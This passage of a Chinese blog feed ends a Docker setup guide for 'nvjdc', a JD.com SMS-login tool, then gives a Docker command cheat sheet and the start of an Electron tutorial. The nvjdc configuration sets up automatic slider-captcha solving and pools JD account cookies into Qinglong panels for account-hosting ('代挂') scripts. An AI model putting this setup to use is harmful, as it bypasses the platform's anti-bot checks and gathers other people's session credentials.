///开启打印等待日志卡短信验证登陆 可开启 拿到日志群里回复 默认不要填写</span><br><span class="line">  "Debug": "",</span><br><span class="line">  ///自动滑块次数5次 5次后手动滑块 可设置为0默认手动滑块</span><br><span class="line">  "AutoCaptchaCount": "5",</span><br><span class="line">  ///XDD PLUS Url  http://IP地址:端口/api/login/smslogin</span><br><span class="line">  "XDDurl": "",</span><br><span class="line">  ///xddToken</span><br><span class="line">  "XDDToken": "",</span><br><span class="line">  ///Push Plus官方网站：http": //www.pushplus.plus  只有青龙模式有用</span><br><span class="line">  ///下方填写您的Token，微信扫码登录后一对一推送或一对多推送下面的token，只填" "PUSH_PLUS_TOKEN",</span><br><span class="line">  "PUSH_PLUS_TOKEN": "",</span><br><span class="line">  //下方填写您的一对多推送的 "群组编码" ，（一对多推送下面-&gt;您的群组(如无则新建)-&gt;群组编码）</span><br><span class="line">  "PUSH_PLUS_USER": "",</span><br><span class="line">  ///青龙配置  注意对接XDD 对接芝士 设置为"Config":[]</span><br><span class="line">  "Config": [</span><br><span class="line">    &#123;</span><br><span class="line">      //序号必填从1 开始</span><br><span class="line">      "QLkey": 1,</span><br><span class="line">      //服务器名称</span><br><span class="line">      "QLName": "阿里云",</span><br><span class="line">      //青龙地址</span><br><span class="line">      "QLurl": "",</span><br><span class="line">      //青龙2,9 OpenApi Client ID</span><br><span class="line">      "QL_CLIENTID": "",</span><br><span class="line">      //青龙2,9 OpenApi Client Secret</span><br><span class="line">      "QL_SECRET": "",</span><br><span class="line">      //CK最大数量</span><br><span class="line">      "QL_CAPACITY": 40,</span><br><span class="line">      "QRurl": ""</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>11.重启</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart nvjdc</span><br></pre></td></tr></table></figure><p><strong>12.查看日志（用处不大）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f nvjdc</span><br></pre></td></tr></table></figure><p>出现 <code>NETJDC started</code> 即可</p><h4 id="更新教程"><a href="#更新教程" class="headerlink" title="更新教程"></a>更新教程</h4><p>确保上面那些文件下载过一遍，更新不会删除上面已下载的文件。</p><p><strong>1.删除容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps  #可以看运行中的镜像名字</span><br><span class="line">docker rm -f nvjdc     #直接删除运行中的nvjdc</span><br></pre></td></tr></table></figure><p><strong>2.删除镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker images #可以看下载的镜像名字</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:0.6</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:0.8</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:0.9</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:0.958</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:1.0</span><br><span class="line">docker rmi -f nolanhzy/nvjdc:1.1</span><br></pre></td></tr></table></figure><p><strong>3.回到安装时创建的目录内，然后重新执行安装教程 8、9</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 比如原来在 root 下 nvjdc 文件夹中</span></span><br><span class="line">cd /root/nvjdc</span><br></pre></td></tr></table></figure><h4 id="对接xdd-plus"><a href="#对接xdd-plus" class="headerlink" title="对接xdd-plus"></a>对接xdd-plus</h4><p><strong>1.修改nvjdc的配置文件</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ///XDD PLUS Url  http://IP地址:端口/api/login/smslogin</span><br><span class="line">  "XDDurl": "",</span><br><span class="line">  ///xddToken</span><br><span class="line">  "XDDToken": "",</span><br><span class="line">  ...</span><br><span class="line">  ///青龙配置  注意对接XDD 对接芝士 设置为"Config":[]</span><br><span class="line">  "Config": []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XDDurl：xdd-plus的地址 例：<code>http://123.123.123.123:8080/api/login/smslogin</code></p><p>XDDToken：xdd-plus配置文件中设置的 <code>master</code> 后台密码</p><p>Config：这里的<code>Config</code>必须为空！</p><p><strong>2.编辑好后保存重启容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart nvjdc</span><br></pre></td></tr></table></figure><p>到这一步已经可以全部正常使用了，看看效果</p><p><img src="https://oss.iyouhun.com/img/QQ20211117-140411@2x.png!yhblog" alt=""></p><p><img src="https://oss.iyouhun.com/img/QQ20211117-140710@2x.png!yhblog" alt=""></p><h4 id="对接傻妞"><a href="#对接傻妞" class="headerlink" title="对接傻妞"></a>对接傻妞</h4><p><strong>1.首先对接过阿东的发下面命令给傻妞机器人删除阿东对接</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete jd_cookie adong_addr</span><br></pre></td></tr></table></figure><p><strong>2.设置若兰（nvjdc）</strong></p><p>给傻妞机器人发命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set jd_cookie nolan_addr http://若兰IP:端口</span><br><span class="line"><span class="meta">#</span><span class="bash"> 例：<span class="built_in">set</span> jd_cookie nolan_addr http://192.168.1.1:5703</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要http://前缀！！！ 需要http://前缀！！！ 需要http://前缀！！！ 重要事情说三遍！！！</span></span><br></pre></td></tr></table></figure><p><strong>3.修改配置文件</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ///浏览器最多几个网页</span><br><span class="line">  "MaxTab": "4",</span><br><span class="line">  //网站标题</span><br><span class="line">  "Title": "游魂博客",</span><br><span class="line">  //回收时间分钟 不填默认3分钟</span><br><span class="line">  "Closetime": "3",</span><br><span class="line">  //网站公告</span><br><span class="line">  "Announcement": "做人，最重要的就是开心啦。",</span><br><span class="line">  ///开启打印等待日志卡短信验证登陆 可开启 拿到日志群里回复 默认不要填写</span><br><span class="line">  "Debug": "",</span><br><span class="line">  ///自动滑块次数5次 5次后手动滑块 可设置为0默认手动滑块</span><br><span class="line">  "AutoCaptchaCount": "5",</span><br><span class="line">  ///XDD PLUS Url  http://IP地址:端口/api/login/smslogin</span><br><span class="line">  "XDDurl": "",</span><br><span class="line">  ///xddToken</span><br><span class="line">  "XDDToken": "",</span><br><span class="line">  ///青龙配置  注意对接XDD 对接芝士 设置为"Config":[]</span><br><span class="line">  "Config": []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4.重启容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker restart nvjdc</span><br></pre></td></tr></table></figure><h3 id="青龙面板ck过多执行任务报-Argument-list-too-long错误解决方案"><a href="#青龙面板ck过多执行任务报-Argument-list-too-long错误解决方案" class="headerlink" title="青龙面板ck过多执行任务报 Argument list too long错误解决方案"></a><a href="https://www.iyouhun.com/post-204.html" target="_blank" rel="noopener">青龙面板ck过多执行任务报 Argument list too long错误解决方案</a></h3><h3 id="青龙面板内部互助最新设置教程"><a href="#青龙面板内部互助最新设置教程" class="headerlink" title="青龙面板内部互助最新设置教程"></a><a href="https://www.iyouhun.com/post-206.html" target="_blank" rel="noopener">青龙面板内部互助最新设置教程</a></h3><h3 id="【合集】-各大JD脚本库合集（最全收藏版）-适用青龙2-10-3及以上"><a href="#【合集】-各大JD脚本库合集（最全收藏版）-适用青龙2-10-3及以上" class="headerlink" title="【合集】 各大JD脚本库合集（最全收藏版）-适用青龙2.10.3及以上"></a><a href="https://www.iyouhun.com/post-207.html" target="_blank" rel="noopener">【合集】 各大JD脚本库合集（最全收藏版）-适用青龙2.10.3及以上</a></h3><hr><p>微信交流群：添加微信<code>iyouhun</code> 发送指令<code>羊毛群</code>自动邀请<br>Q Q 交流群：<a href="https://qm.qq.com/cgi-bin/qm/qr?k=M9tDat17Ok9X5PGqRHl3jUV5n8UbO_8O&amp;jump_from=webapi" target="_blank" rel="noopener">点我加Q群：56359657</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;懒癌必备，京东代挂 &lt;a href=&quot;https://jd.jhcda.top/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;直接上车链接&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="资源" scheme="//www.shen.ee/categories/%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="青龙" scheme="//www.shen.ee/tags/%E9%9D%92%E9%BE%99/"/>
    
      <category term="青龙面板" scheme="//www.shen.ee/tags/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF/"/>
    
      <category term="青龙面板搭建" scheme="//www.shen.ee/tags/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E6%90%AD%E5%BB%BA/"/>
    
      <category term="青龙面板安装" scheme="//www.shen.ee/tags/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AE%89%E8%A3%85/"/>
    
      <category term="京东代挂" scheme="//www.shen.ee/tags/%E4%BA%AC%E4%B8%9C%E4%BB%A3%E6%8C%82/"/>
    
      <category term="京东免费代挂" scheme="//www.shen.ee/tags/%E4%BA%AC%E4%B8%9C%E5%85%8D%E8%B4%B9%E4%BB%A3%E6%8C%82/"/>
    
      <category term="机器人" scheme="//www.shen.ee/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
      <category term="京东代挂机器人" scheme="//www.shen.ee/tags/%E4%BA%AC%E4%B8%9C%E4%BB%A3%E6%8C%82%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
      <category term="xdd-plus" scheme="//www.shen.ee/tags/xdd-plus/"/>
    
      <category term="傻妞sillyGirl" scheme="//www.shen.ee/tags/%E5%82%BB%E5%A6%9EsillyGirl/"/>
    
      <category term="傻妞机器人" scheme="//www.shen.ee/tags/%E5%82%BB%E5%A6%9E%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
      <category term="nvjdc" scheme="//www.shen.ee/tags/nvjdc/"/>
    
      <category term="Nolan" scheme="//www.shen.ee/tags/Nolan/"/>
    
      <category term="京东短信登录" scheme="//www.shen.ee/tags/%E4%BA%AC%E4%B8%9C%E7%9F%AD%E4%BF%A1%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Docker常用命令|备忘单</title>
    <link href="//www.shen.ee/article/44434.html"/>
    <id>//www.shen.ee/article/44434.html</id>
    <published>2021-11-22T07:47:49.000Z</published>
    <updated>2022-06-22T06:24:25.990Z</updated>
    
    <content type="html"><![CDATA[<p><code>Docker</code> 是一个用于开发、传送和运行应用程序的开放平台。<code>Docker</code> 使您能够将应用程序与基础设施分开，以便您可以快速交付软件。使用 Docker，您可以像管理应用程序一样管理基础设施。通过利用 Docker 的快速交付、测试和部署代码的方法，您可以显着减少编写代码和在生产中运行代码之间的延迟。在这篇文章中，我将提到我们需要或大多数用例的 <code>docker</code> 命令。</p><h2 id="生命周期命令"><a href="#生命周期命令" class="headerlink" title="生命周期命令"></a>生命周期命令</h2><p><strong>创建一个容器（不启动它）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker create [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用docker镜像nginx:latest创建一个容器,并将容器命名为mynginx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker create  --name mynginx  nginx:latest</span></span><br></pre></td></tr></table></figure><p><strong>创建一个新的容器并运行一个命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker run --name mynginx -d nginx:latest</span></span><br></pre></td></tr></table></figure><p><strong>OPTIONS说明:</strong></p><ul><li><strong>-a stdin:</strong> 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li><li><strong>-i:</strong> 以交互模式运行容器，通常与 -t 同时使用；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口</li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong></li><li><strong>-t:</strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</li><li><strong>–name=”nginx-lb”:</strong> 为容器指定一个名称；</li><li><strong>–dns 8.8.8.8:</strong> 指定容器使用的DNS服务器，默认和宿主一致；</li><li><strong>–dns-search example.com:</strong> 指定容器DNS搜索域名，默认和宿主一致；</li><li><strong>-h “mars”:</strong> 指定容器的hostname；</li><li><strong>-e username=”ritchie”:</strong> 设置环境变量；</li><li><strong>–env-file=[]:</strong> 从指定文件读入环境变量；</li><li><strong>–cpuset=”0-2” or –cpuset=”0,1,2”:</strong> 绑定容器到指定CPU运行；</li><li><strong>-m :</strong>设置容器使用内存最大值；</li><li><strong>–net=”bridge”:</strong> 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</li><li><strong>–link=[]:</strong> 添加链接到另一个容器；</li><li><strong>–expose=[]:</strong> 开放一个端口或一组端口；</li><li><strong>–volume , -v:</strong> 绑定一个卷</li></ul><p><strong>重命名现有容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rename [CONTAINER_NAME] [NEW_CONTAINER_NAME]</span><br></pre></td></tr></table></figure><p><strong>在新容器中运行命令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [IMAGE] [COMMAND]</span><br></pre></td></tr></table></figure><p><strong>退出后移除容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>启动一个容器并保持运行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -td [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>启动一个容器并在容器中创建一个交互式 bash shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>在容器内创建、启动和运行命令，并在执行命令后移除容器。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it-rm [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>在已经运行的容器内执行命令。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [container]</span><br></pre></td></tr></table></figure><p><strong>删除一个容器（如果它没有运行）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>更新容器的配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update [CONTAINER]</span><br></pre></td></tr></table></figure><h2 id="启动和停止容器"><a href="#启动和停止容器" class="headerlink" title="启动和停止容器"></a>启动和停止容器</h2><p><strong>启动容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>停止运行容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>停止运行容器并重新启动它</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>暂停正在运行的容器中的进程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pause [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>取消暂停正在运行的容器中的进程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker unpause [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>阻塞一个容器直到其他容器停止</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker wait [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>通过向正在运行的容器发送 SIGKILL 来杀死容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>将本地标准输入、输出和错误流附加到正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [CONTAINER]</span><br></pre></td></tr></table></figure><h2 id="Docker-镜像命令"><a href="#Docker-镜像命令" class="headerlink" title="Docker 镜像命令"></a>Docker 镜像命令</h2><p><strong>从 Dockerfile 创建镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build [URL/FILE]</span><br></pre></td></tr></table></figure><p><strong>从带有标签的 Dockerfile 创建镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &lt;tag&gt; [URL/FILE]</span><br></pre></td></tr></table></figure><p><strong>从注册表中心拉取镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>将镜像推送到注册中心</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>从 tarball 创建镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import [URL/FILE]</span><br></pre></td></tr></table></figure><p><strong>从容器创建镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [CONTAINER] [NEW_IMAGE_NAME]</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [IMAGE]</span><br></pre></td></tr></table></figure><p><strong>从 tar 存档或标准输入加载镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load [TAR_FILE/STDIN_FILE]</span><br></pre></td></tr></table></figure><p><strong>将镜像保存到 tar 存档</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [IMAGE] &gt; [TAR_FILE]</span><br></pre></td></tr></table></figure><h2 id="Docker-容器和镜像信息"><a href="#Docker-容器和镜像信息" class="headerlink" title="Docker 容器和镜像信息"></a>Docker 容器和镜像信息</h2><p><strong>列出正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>列出正在运行的容器和已停止的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><strong>列出正在运行的容器中的日志</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>列出 Docker 对象的低级信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [OBJECT_NAME/ID]</span><br></pre></td></tr></table></figure><p><strong>列出来自容器的实时事件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker events [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>显示容器的端口映射</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>显示容器中正在运行的进程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>显示容器的实时资源使用统计</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stats [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>显示文件系统上文件（或目录）的更改</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker diff [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>列出本地使用 docker 引擎存储的所有镜像</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker [image] ls</span><br></pre></td></tr></table></figure><p><strong>显示镜像的历史</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history [IMAGE]</span><br></pre></td></tr></table></figure><h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><p><strong>列出网络</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p><strong>删除一个或多个网络</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network rm [NETWORK]</span><br></pre></td></tr></table></figure><p><strong>显示一个或多个网络的信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network inspect [NETWORK]</span><br></pre></td></tr></table></figure><p><strong>将容器连接到网络</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network connect [NETWORK] [CONTAINER]</span><br></pre></td></tr></table></figure><p><strong>断开容器与网络的连接</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network disconnect [NETWORK] [CONTAINER]</span><br></pre></td></tr></table></figure><h2 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h2><p><strong>从容器里面拷文件到宿主机</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker cp 容器名：要拷贝的文件在容器里面的路径   要拷贝到宿主机的相应路径 </span></span><br><span class="line">docker cp testtomcat:/usr/local/tomcat/webapps/test/js/test.js /root</span><br></pre></td></tr></table></figure><p><strong>从宿主机拷文件到容器里面</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker cp 要拷贝的文件路径 容器名:要拷贝到容器里面对应的路径</span></span><br><span class="line">docker cp /root/test.js testtomcat:/usr/local/tomcat/webapps/test/js</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;Docker&lt;/code&gt; 是一个用于开发、传送和运行应用程序的开放平台。&lt;code&gt;Docker&lt;/code&gt; 使您能够将应用程序与基础设施分开，以便您可以快速交付软件。使用 Docker，您可以像管理应用程序一样管理基础设施。通过利用 Docker 的快速交
      
    
    </summary>
    
      <category term="后端" scheme="//www.shen.ee/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Docker" scheme="//www.shen.ee/tags/Docker/"/>
    
      <category term="Docker命令" scheme="//www.shen.ee/tags/Docker%E5%91%BD%E4%BB%A4/"/>
    
      <category term="Docker常用命令" scheme="//www.shen.ee/tags/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    
      <category term="Docker入门" scheme="//www.shen.ee/tags/Docker%E5%85%A5%E9%97%A8/"/>
    
      <category term="Docker快速上手" scheme="//www.shen.ee/tags/Docker%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
    
      <category term="Docker创建容器" scheme="//www.shen.ee/tags/Docker%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Docker复制文件" scheme="//www.shen.ee/tags/Docker%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Electron快速上手并将网站直接生成桌面应用</title>
    <link href="//www.shen.ee/article/9481.html"/>
    <id>//www.shen.ee/article/9481.html</id>
    <published>2021-11-20T02:31:42.000Z</published>
    <updated>2021-11-22T07:51:49.540Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>使用 JavaScript，HTML 和 CSS 构建跨平台的桌面应用程序</p></blockquote><ul><li>基于 Chromium 和 Node.js</li><li>让你可以使用 HTML, CSS 和 JavaScript 构建应用</li><li>开源</li><li>跨平台（Windows、Mac、Linux）</li></ul><p><strong>Atom</strong>、Postman、Notion、Vscode等都是用<code>Electron</code>开发的</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>1.创建文件并初始化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir Hello-world &amp;&amp; cd Hello-world</span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>记得修改入口文件，并在根目录创建入口文件 <code>main.js</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  "main": "main.js",</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.安装<code>electron</code>依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev electron</span><br></pre></td></tr></table></figure><p>3.在<code>package.json</code>配置文件中的<code>scripts</code>字段下增加一条<code>start</code>命令</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"electron ."</span></span><br><span class="line">  &#125;</span><br><span 